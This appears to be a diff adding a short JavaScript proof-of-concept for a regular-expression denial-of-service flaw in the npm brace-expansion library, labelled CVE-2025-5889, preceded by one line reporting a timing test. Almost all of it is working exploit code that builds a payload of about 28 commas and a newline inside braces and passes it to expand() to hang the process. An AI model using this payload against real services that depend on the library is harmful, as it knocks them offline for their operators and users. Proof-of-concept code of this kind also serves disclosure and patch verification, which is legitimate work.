@@ -1,0 +1,20 @@
+n=27 already takes 11 seconds — confirms catastrophic (exponential) backtracking. Final exploit:
+
+```javascript
+// ReDoS in brace-expansion (CVE-2025-5889): catastrophic backtracking in the
+// `/^(.*,)+(.+)?$/`-style check inside expand() when a brace body made of many
+// commas is followed by a trailing newline before the closing brace.
+const expand = require("brace-expansion");
+
+// ~28 repeated commas + trailing newline is enough to hang the process for
+// many seconds; each additional comma roughly doubles the running time.
+const n = 28;
+const payload = "{" + ",".repeat(n) + "\n}";
+
+console.log("Triggering ReDoS with payload length:", payload.length);
+const start = Date.now();
+
+expand(payload); // hangs / blocks the event loop for a long time
+
+console.log("Finished in", Date.now() - start, "ms");
+```
